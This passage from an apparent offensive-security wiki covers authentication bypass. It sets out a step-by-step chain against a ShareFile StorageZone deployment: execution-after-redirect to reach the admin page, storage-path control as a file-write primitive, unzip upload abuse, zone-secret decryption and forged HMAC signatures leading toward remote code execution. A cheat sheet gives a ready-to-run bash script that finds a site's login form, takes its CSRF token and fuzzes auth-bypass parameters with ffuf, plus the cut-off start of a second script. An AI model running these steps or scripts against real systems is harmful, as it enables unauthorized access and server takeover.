if ($SESSION_ref->{'successful_internal_auth_with_timestamp'}) {
    $successful_internal_auth_with_timestamp =
        $SESSION_ref->{'successful_internal_auth_with_timestamp'};
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
if (successful_external_auth_with_timestamp || successful_internal_auth_with_timestamp)
{
    authorized = _check_external_internal_auth_from_docheckpass(OPTS);
}

...

if (SESSION_ref["successful_internal_auth_with_timestamp"] != null)
{
    successful_internal_auth_with_timestamp =
        SESSION_ref["successful_internal_auth_with_timestamp"];
}
```
{% endtab %}

{% tab title="Java" %}
```java
if (successful_external_auth_with_timestamp || successful_internal_auth_with_timestamp) {
    authorized = _check_external_internal_auth_from_docheckpass(OPTS);
}

...

if (SESSION_ref.get("successful_internal_auth_with_timestamp") != null) {
    successful_internal_auth_with_timestamp =
        SESSION_ref.get("successful_internal_auth_with_timestamp");
}
```
{% endtab %}

{% tab title="PHP" %}
```php
if ($successful_external_auth_with_timestamp || $successful_internal_auth_with_timestamp) {
    $authorized = _check_external_internal_auth_from_docheckpass($OPTS);
}

...

if (isset($SESSION_ref['successful_internal_auth_with_timestamp'])) {
    $successful_internal_auth_with_timestamp =
        $SESSION_ref['successful_internal_auth_with_timestamp'];
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
if (successful_external_auth_with_timestamp || successful_internal_auth_with_timestamp) {
    authorized = _check_external_internal_auth_from_docheckpass(OPTS);
}

...

if (SESSION_ref.successful_internal_auth_with_timestamp != null) {
    successful_internal_auth_with_timestamp =
        SESSION_ref.successful_internal_auth_with_timestamp;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Modify the condition in the code to bypass password verification, send the request again, and obtain a 200 response
{% endstep %}
{% endstepper %}

***

#### Bypass Authentication To RCE

{% stepper %}
{% step %}
Extract all DLL files and decompile them into C# code
{% endstep %}

{% step %}
Run the application in a production-like environment and fully connect it to external services (SaaS)
{% endstep %}

{% step %}
List all accessible endpoints and files: `ASHX / ASPX / ASMX` and REST endpoints defined in the `web.config` file
{% endstep %}

{% step %}
List all `.aspx` files and send a request to each one (for example: `/ConfigService/Admin.aspx`). Then review the response status codes and separate abnormal responses (anything other than `401/403`)
{% endstep %}

{% step %}
Prioritize endpoints (such as `ConfigService/Admin.aspx`) that return `302`. Check the `Content-Length` and response body in the redirect response
{% endstep %}

{% step %}
If the response body still contains the actual page content despite the redirect, treat it as an anomaly. Then check whether server-side execution stops after the redirect or continues (Execution After Redirect)

```http
HTTP/1.1 302 Found
Cache-Control: private,no-store
Pragma: no-cache
Content-Type: text/html; charset=utf-8
Location: /ConfigService/Login.aspx?callerpage=Admin
Server: Microsoft-IIS/10.0
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 540
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Methods: GET, POST, PATCH, DELETE, OPTIONS, HEAD
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
Date: Mon, 23 Mar 2026 01:59:44 GMT
Content-Length: 22448

<html><head><title>Object moved</title></head><body>
<h2>Object moved to <a href="/ConfigService/Login.aspx?callerpage=Admin">here</a>.</h2>
</body></html>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "<http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd>">

<html xmlns="<http://www.w3.org/1999/xhtml>">
<head id="ctl00_Head1"><title>
	ShareFile - Where Companies Connect
</title>
[... Truncated ...]
```
{% endstep %}

{% step %}
Treat endpoints that return full content after redirect as candidates for authentication bypass
{% endstep %}

{% step %}
After sending requests to sensitive pages (like admin pages) and receiving responses such as `302`, use HTTP tools to remove the `Location` header or change the response status code to `200`. If the page renders, the vulnerability exists
{% endstep %}

{% step %}
Go to the source code of the vulnerable file (e.g., `ConfigService/Admin.aspx`). Find the method that loads the page and check whether it validates authentication or simply redirects unauthenticated users

{% tabs %}
{% tab title="C#" %}
```csharp
protected void Page_Load(object sender, EventArgs e)
		{
			this._logger.LogDebug("Page_Load Enter", Array.Empty<object>());
			this.Master.ActionHeader = "Select ShareFile " + (Admin.isMultiTenant ? "Multi-Tenant " : string.Empty) + "StorageZone";
			this.Master.HeaderTitle = "<span class=\\"ico24 icoAdmin\\"></span>" + (Admin.isMultiTenant ? "Multi-Tenant " : string.Empty) + "StorageZone Setup";
			if (!this._sessionHelper.IsSessionAuthenticated(HttpContext.Current.Session)) // <---- [0]
			{
				this._logger.LogDebug("Not authenticated", Array.Empty<object>());
				string redirectPathWithCallerInfo = this._redirectionHelper.GetRedirectPathWithCallerInfo(WebPage.Login, WebPage.Admin);
				this._redirectionHelper.RedirectAndCompleteRequest(new HttpContextWrapper(HttpContext.Current), redirectPathWithCallerInfo); // <---- [1]
				return;
			}
```
{% endtab %}

{% tab title="Java" %}
```java
protected void pageLoad(HttpServletRequest request, HttpServletResponse response) {

    logger.debug("Page_Load Enter");

    this.master.setActionHeader("Select ShareFile " + (Admin.isMultiTenant ? "Multi-Tenant " : "") + "StorageZone");
    this.master.setHeaderTitle("<span class=\"ico24 icoAdmin\"></span>" + (Admin.isMultiTenant ? "Multi-Tenant " : "") + "StorageZone Setup");

    if (!this.sessionHelper.isSessionAuthenticated(request.getSession())) {

        logger.debug("Not authenticated");

        String redirectPathWithCallerInfo =
                this.redirectionHelper.getRedirectPathWithCallerInfo(WebPage.Login, WebPage.Admin);

        this.redirectionHelper.redirectAndCompleteRequest(request, response, redirectPathWithCallerInfo);
        return;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function Page_Load($sender, $e)
{
    $this->_logger->LogDebug("Page_Load Enter", []);

    $this->Master->ActionHeader = "Select ShareFile " . (Admin::$isMultiTenant ? "Multi-Tenant " : "") . "StorageZone";
    $this->Master->HeaderTitle = "<span class=\"ico24 icoAdmin\"></span>" . (Admin::$isMultiTenant ? "Multi-Tenant " : "") . "StorageZone Setup";

    if (!$this->_sessionHelper->IsSessionAuthenticated($_SESSION)) {

        $this->_logger->LogDebug("Not authenticated", []);

        $redirectPathWithCallerInfo =
            $this->_redirectionHelper->GetRedirectPathWithCallerInfo(WebPage::Login, WebPage::Admin);

        $this->_redirectionHelper->RedirectAndCompleteRequest($redirectPathWithCallerInfo);
        return;
    }
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function pageLoad(req, res) {

    this._logger.LogDebug("Page_Load Enter", []);

    this.Master.ActionHeader = "Select ShareFile " + (Admin.isMultiTenant ? "Multi-Tenant " : "") + "StorageZone";
    this.Master.HeaderTitle = "<span class=\"ico24 icoAdmin\"></span>" + (Admin.isMultiTenant ? "Multi-Tenant " : "") + "StorageZone Setup";

    if (!this._sessionHelper.IsSessionAuthenticated(req.session)) {

        this._logger.LogDebug("Not authenticated", []);

        let redirectPathWithCallerInfo =
            this._redirectionHelper.GetRedirectPathWithCallerInfo(WebPage.Login, WebPage.Admin);

        this._redirectionHelper.RedirectAndCompleteRequest(req, res, redirectPathWithCallerInfo);
        return;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then review the method responsible for redirect (such as `RedirectAndCompleteRequest`). Check how it processes the request and look for patterns where execution continues instead of stopping (no termination like `die`)

{% tabs %}
{% tab title="C#" %}
```csharp
	public void RedirectAndCompleteRequest(HttpContextBase httpContext, string redirectPath)
		{
			httpContext.Response.Redirect(redirectPath, false); // <---- [2]
			HttpApplication applicationInstance = httpContext.ApplicationInstance;
			if (applicationInstance == null)
			{
				return;
			}
			applicationInstance.CompleteRequest();
		}
```
{% endtab %}

{% tab title="Java" %}
```java
public void redirectAndCompleteRequest(HttpServletRequest request, HttpServletResponse response, String redirectPath) throws IOException {

    response.sendRedirect(redirectPath);

    Object applicationInstance = request.getServletContext();
    if (applicationInstance == null) {
        return;
    }

    // Equivalent to CompleteRequest (no direct equivalent, placeholder)
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function RedirectAndCompleteRequest($httpContext, $redirectPath)
{
    header("Location: " . $redirectPath, true, 302);

    $applicationInstance = $httpContext['ApplicationInstance'] ?? null;
    if ($applicationInstance == null) {
        return;
    }

    // CompleteRequest equivalent (no direct PHP equivalent)
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function RedirectAndCompleteRequest(httpContext, redirectPath) {

    httpContext.response.redirect(redirectPath);

    let applicationInstance = httpContext.applicationInstance;
    if (!applicationInstance) {
        return;
    }

    // CompleteRequest equivalent (framework-dependent)
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
After authentication bypass, test all admin panel features in a pre-auth state and identify paths like `Create / Join / Modify`
{% endstep %}

{% step %}
Focus on `Modify / Join` paths because they are usually accessible without initial setup
{% endstep %}

{% step %}
Review configuration fields (`Network / Storage / Security`) and determine which ones accept user input and which are server-side assigned
{% endstep %}

{% step %}
If sensitive values (such as passphrase) are automatically filled by the server during editing, treat it as a security bypass and a path to infrastructure access
{% endstep %}

{% step %}
If the product uses zone controllers with a primary zone controller, analyze the trust relationship between zone controllers and the primary one. Check how trust is established (e.g., encryption between APIs)
{% endstep %}

{% step %}
Test whether all sensitive fields use the same validation level (e.g., encrypted API communication) or if some paths bypass it. If needed, analyze the component responsible for API communication and encryption to see if it can be bypassed
{% endstep %}

{% step %}
If no bypass is found, check whether after authentication bypass you can define a new Primary Zone Controller and whether the passphrase is validated or filtered. If not, an attacker can connect zone controllers to their own primary controller
{% endstep %}

{% step %}
Identify upload/storage functionality in the system and check whether the user can control the file storage path
{% endstep %}

{% step %}
Find storage-related parameters (such as Network Share Location) and determine whether they accept local paths, UNC paths, or cloud paths
{% endstep %}

{% step %}
Analyze the validation mechanism for the storage path (such as write/delete tests). Check whether it only verifies writability or also validates security (preventing webroot or sensitive paths)

{% tabs %}
{% tab title="C#" %}
```csharp
	private BaseActionResult ValidateStorageLocation(string filePath, string storageLocationType)
{
    BaseActionResult baseActionResult = new BaseActionResult
    {
        IsSuccess = true,
        Message = string.Empty
    };
    try
    {
        using (StreamWriter streamWriter = new StreamWriter(filePath, false))
        {
            streamWriter.Write("SCTest");
            streamWriter.Flush();
        }
    }
    catch (Exception ex)
    {
        this._logger.LogError(ex, "An error occurred validating storage location: writing to " + filePath, Array.Empty<object>());
        baseActionResult.IsSuccess = false;
        baseActionResult.Message = string.Concat(new string[] { "Problem accessing ", storageLocationType, " Location. Check if the ", storageLocationType, " Location is correct and the user has write permission." });
        return baseActionResult;
    }
    try
    {
        if (File.Exists(filePath))
        {
            File.Delete(filePath);
        }
    }
    catch (Exception ex2)
    {
        this._logger.LogError(ex2, "An error occurred validating storage location: deleting " + filePath, Array.Empty<object>());
        baseActionResult.IsSuccess = false;
        baseActionResult.Message = string.Concat(new string[] { "Problem accessing ", storageLocationType, " Location. Check if the ", storageLocationType, " Location is correct and the user has delete permission." });
        return baseActionResult;
    }
    return baseActionResult;
}
```
{% endtab %}

{% tab title="Java" %}
```java
private BaseActionResult validateStorageLocation(String filePath, String storageLocationType) {

    BaseActionResult baseActionResult = new BaseActionResult();
    baseActionResult.setIsSuccess(true);
    baseActionResult.setMessage("");

    try {
        FileWriter writer = new FileWriter(filePath, false);
        writer.write("SCTest");
        writer.flush();
        writer.close();
    } catch (Exception ex) {
        this.logger.logError(ex, "An error occurred validating storage location: writing to " + filePath);
        baseActionResult.setIsSuccess(false);
        baseActionResult.setMessage("Problem accessing " + storageLocationType + " Location. Check if the " + storageLocationType + " Location is correct and the user has write permission.");
        return baseActionResult;
    }

    try {
        File file = new File(filePath);
        if (file.exists()) {
            file.delete();
        }
    } catch (Exception ex2) {
        this.logger.logError(ex2, "An error occurred validating storage location: deleting " + filePath);
        baseActionResult.setIsSuccess(false);
        baseActionResult.setMessage("Problem accessing " + storageLocationType + " Location. Check if the " + storageLocationType + " Location is correct and the user has delete permission.");
        return baseActionResult;
    }

    return baseActionResult;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function ValidateStorageLocation($filePath, $storageLocationType)
{
    $baseActionResult = new BaseActionResult();
    $baseActionResult->IsSuccess = true;
    $baseActionResult->Message = '';

    try {
        $streamWriter = fopen($filePath, 'w');
        fwrite($streamWriter, "SCTest");
        fflush($streamWriter);
        fclose($streamWriter);
    } catch (Exception $ex) {
        $this->_logger->LogError($ex, "An error occurred validating storage location: writing to " . $filePath, []);
        $baseActionResult->IsSuccess = false;
        $baseActionResult->Message = "Problem accessing " . $storageLocationType . " Location. Check if the " . $storageLocationType . " Location is correct and the user has write permission.";
        return $baseActionResult;
    }

    try {
        if (file_exists($filePath)) {
            unlink($filePath);
        }
    } catch (Exception $ex2) {
        $this->_logger->LogError($ex2, "An error occurred validating storage location: deleting " . $filePath, []);
        $baseActionResult->IsSuccess = false;
        $baseActionResult->Message = "Problem accessing " . $storageLocationType . " Location. Check if the " . $storageLocationType . " Location is correct and the user has delete permission.";
        return $baseActionResult;
    }

    return $baseActionResult;
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function ValidateStorageLocation(filePath, storageLocationType) {

    let baseActionResult = {
        IsSuccess: true,
        Message: ""
    };

    const fs = require("fs");

    try {
        fs.writeFileSync(filePath, "SCTest");
    } catch (ex) {
        this._logger.LogError(ex, "An error occurred validating storage location: writing to " + filePath, []);
        baseActionResult.IsSuccess = false;
        baseActionResult.Message = "Problem accessing " + storageLocationType + " Location. Check if the " + storageLocationType + " Location is correct and the user has write permission.";
        return baseActionResult;
    }

    try {
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
        }
    } catch (ex2) {
        this._logger.LogError(ex2, "An error occurred validating storage location: deleting " + filePath, []);
        baseActionResult.IsSuccess = false;
        baseActionResult.Message = "Problem accessing " + storageLocationType + " Location. Check if the " + storageLocationType + " Location is correct and the user has delete permission.";
        return baseActionResult;
    }

    return baseActionResult;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
If path control is successful, treat it as a “file write primitive” in the application execution path
{% endstep %}

{% step %}
Look for file upload endpoints and check whether they use unzip. If files inside the ZIP are not validated and are stored directly in a UNC path, the vulnerability is confirmed

{% tabs %}
{% tab title="C#" %}
```csharp
	protected void Page_Load(object sender, EventArgs e)
{
    string text = "";
    string text2 = "";
    long num = 0L;
    if (this.Page.Request.HttpMethod == "OPTIONS")
    {
        base.Response.End();
    }
    try
    {
        NameValueCollection requestKeys = SCWebUtils.GetRequestKeys(HttpContext.Current, "filename");
        text = requestKeys["uploadid"];
        if (string.IsNullOrEmpty(text))
        {
            text = Guid.NewGuid().ToString("n");
        }
        UploadLogic.CheckForAvailableDiskSpace((requestKeys["filesize"] == null) ? (-1L) : long.Parse(requestKeys["filesize"]));
        this.ValidateIsPost(text);
        string text3;
        string text4;
        string text5;
        string text6;
        UploadLogic.GetBasePath(requestKeys, out text3, out text4, out text5, out text6);
        this.ValidateParameters(text, text3, text4);
        string onFinishUrl = this.GetOnFinishUrl(text, requestKeys);
        ShareFileUploadNotification shareFileUploadNotification = new ShareFileUploadNotification();
        Hashtable hashtable = new Hashtable();
        Hashtable hashtable2 = new Hashtable();
        Hashtable hashtable3 = new Hashtable();
        int num2 = 0;
        bool flag = false;
        if (requestKeys["unzip"] != null && (requestKeys["unzip"] == "true" || requestKeys["unzip"] == "on")) // [1]
        {
            flag = true;
        }
        if (flag)
        {
            num2 += Upload.UnzipFiles(new InputFile[]
            {
                this.File1, this.File2, this.File3, this.File4, this.File5, this.File6, this.File7, this.File8, this.File9, this.File10,
                this.Filedata
            }, shareFileUploadNotification, text, hashtable, hashtable3, text3, text4); // [2]
        }
        //...
}
```
{% endtab %}

{% tab title="Java" %}
```java
protected void pageLoad(HttpServletRequest request, HttpServletResponse response) {

    String text = "";
    String text2 = "";
    long num = 0L;

    if ("OPTIONS".equalsIgnoreCase(request.getMethod())) {
        return;
    }

    try {
        Map<String, String> requestKeys = SCWebUtils.getRequestKeys(request, "filename");

        text = requestKeys.get("uploadid");
        if (text == null || text.isEmpty()) {
            text = UUID.randomUUID().toString().replace("-", "");
        }

        UploadLogic.checkForAvailableDiskSpace(
                requestKeys.get("filesize") == null ? -1L : Long.parseLong(requestKeys.get("filesize"))
        );

        this.validateIsPost(text);

        String text3, text4, text5, text6;
        String[] basePaths = UploadLogic.getBasePath(requestKeys);
        text3 = basePaths[0];
        text4 = basePaths[1];
        text5 = basePaths[2];
        text6 = basePaths[3];

        this.validateParameters(text, text3, text4);

        String onFinishUrl = this.getOnFinishUrl(text, requestKeys);

        ShareFileUploadNotification shareFileUploadNotification = new ShareFileUploadNotification();

        Map<String, Object> hashtable = new HashMap<>();
        Map<String, Object> hashtable2 = new HashMap<>();
        Map<String, Object> hashtable3 = new HashMap<>();

        int num2 = 0;
        boolean flag = false;

        if (requestKeys.get("unzip") != null &&
            (requestKeys.get("unzip").equals("true") || requestKeys.get("unzip").equals("on"))) {
            flag = true;
        }

        if (flag) {
            num2 += Upload.unzipFiles(
                new InputFile[]{File1, File2, File3, File4, File5, File6, File7, File8, File9, File10, Filedata},
                shareFileUploadNotification,
                text,
                hashtable,
                hashtable3,
                text3,
                text4
            );
        }

        //...
    } catch (Exception ignored) {}
}
```
{% endtab %}

{% tab title="PHP" %}
```php
protected function Page_Load($sender, $e)
{
    $text = "";
    $text2 = "";
    $num = 0;

    if ($_SERVER['REQUEST_METHOD'] === "OPTIONS") {
        exit;
    }

    try {
        $requestKeys = SCWebUtils::GetRequestKeys($_REQUEST, "filename");

        $text = $requestKeys["uploadid"] ?? "";
        if (empty($text)) {
            $text = bin2hex(random_bytes(16));
        }

        UploadLogic::CheckForAvailableDiskSpace(
            isset($requestKeys["filesize"]) ? (int)$requestKeys["filesize"] : -1
        );

        $this->ValidateIsPost($text);

        list($text3, $text4, $text5, $text6) = UploadLogic::GetBasePath($requestKeys);

        $this->ValidateParameters($text, $text3, $text4);

        $onFinishUrl = $this->GetOnFinishUrl($text, $requestKeys);

        $shareFileUploadNotification = new ShareFileUploadNotification();

        $hashtable = [];
        $hashtable2 = [];
        $hashtable3 = [];

        $num2 = 0;
        $flag = false;

        if (isset($requestKeys["unzip"]) && ($requestKeys["unzip"] == "true" || $requestKeys["unzip"] == "on")) {
            $flag = true;
        }

        if ($flag) {
            $num2 += Upload::UnzipFiles(
                [$this->File1, $this->File2, $this->File3, $this->File4, $this->File5,
                 $this->File6, $this->File7, $this->File8, $this->File9, $this->File10,
                 $this->Filedata],
                $shareFileUploadNotification,
                $text,
                $hashtable,
                $hashtable3,
                $text3,
                $text4
            );
        }

        //...
    } catch (Exception $e) {}
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function pageLoad(req, res) {

    let text = "";
    let text2 = "";
    let num = 0;

    if (req.method === "OPTIONS") {
        res.end();
        return;
    }

    try {
        let requestKeys = SCWebUtils.getRequestKeys(req, "filename");

        text = requestKeys["uploadid"];
        if (!text) {
            text = require("crypto").randomBytes(16).toString("hex");
        }

        UploadLogic.CheckForAvailableDiskSpace(
            requestKeys["filesize"] ? parseInt(requestKeys["filesize"]) : -1
        );

        this.ValidateIsPost(text);

        let [text3, text4, text5, text6] = UploadLogic.GetBasePath(requestKeys);

        this.ValidateParameters(text, text3, text4);

        let onFinishUrl = this.GetOnFinishUrl(text, requestKeys);

        let shareFileUploadNotification = new ShareFileUploadNotification();

        let hashtable = {};
        let hashtable2 = {};
        let hashtable3 = {};

        let num2 = 0;
        let flag = false;

        if (requestKeys["unzip"] && (requestKeys["unzip"] === "true" || requestKeys["unzip"] === "on")) {
            flag = true;
        }

        if (flag) {
            num2 += Upload.UnzipFiles(
                [this.File1, this.File2, this.File3, this.File4, this.File5,
                 this.File6, this.File7, this.File8, this.File9, this.File10,
                 this.Filedata],
                shareFileUploadNotification,
                text,
                hashtable,
                hashtable3,
                text3,
                text4
            );
        }

        //...
    } catch (e) {}
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Find all endpoints related to ConfigService and management APIs (especially those returning zone configurations)
{% endstep %}

{% step %}
Test these endpoints with and without HMAC signatures and check whether sensitive data is accessible without authentication
{% endstep %}

{% step %}
In responses, look for encoded or Base64 fields (such as `TempData2`), which may contain internal keys or secrets
{% endstep %}

{% step %}
Analyze how this encoded data is generated (e.g., AES + salt + passphrase) and check whether the passphrase can be accessed via bypass or another endpoint
{% endstep %}

{% step %}
If the passphrase or encryption key is obtained, decrypt the data to extract the main system secret (Zone Secret)
{% endstep %}

{% step %}
Check where this secret is used (for example, HMAC for upload or request validation)
{% endstep %}

{% step %}
Use the extracted secret to generate valid signatures (HMAC-SHA256) for sensitive requests and bypass security restrictions
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

### Parameter Modification <a href="#parameter-modification" id="parameter-modification"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-params.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git curl golang ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=12341234@"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Auth Bypass Header
payload_list="/tmp/payloads.txt"
cat > $payload_list << EOF
authenticated=yes
authenticated=true
authenticated=1
logged_in=yes
logged_in=true
logged_in=1
is_logged_in=yes
is_logged_in=true
is_logged_in=1
is_authenticated=yes
is_authenticated=true
is_authenticated=1
auth=yes
auth=true
auth=1
auth_user=yes
auth_user=true
auth_user=1
auth_user_id=yes
auth_user_id=true
auth_user_id=1
auth_role=yes
auth_role=true
auth_role=1
auth_role_id=yes
auth_role_id=true
auth_role_id=1
auth_role_name=yes
auth_role_name=true
auth_role_name=1
EOF
​
# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL?FUZZ" \
         -w "$payload_list:FUZZ" \
         -X GET \
         -ac -c -r -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION?FUZZ" \
         -w "$payload_list:FUZZ" \
         -X POST -d "$DATA" \
         -ac -c -r -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-params.sh;sudo ./auth-bypass-params.sh $WEBSITE
```

### Session ID Prediction <a href="#session-id-prediction" id="session-id-prediction"></a>

{% hint style="info" %}
Burpsuite > Intercept Request (Generative Page) > Right Click > Send Sequencer Section > Start Analyze
{% endhint %}

### SQL Injection (HTML Form Authentication) <a href="#sql-injection-html-form-authentication" id="sql-injection-html-form-authentication"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [SQLMap](https://github.com/sqlmapproject/sqlmap)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-sqli.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git curl golang ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page."
    exit 1
fi

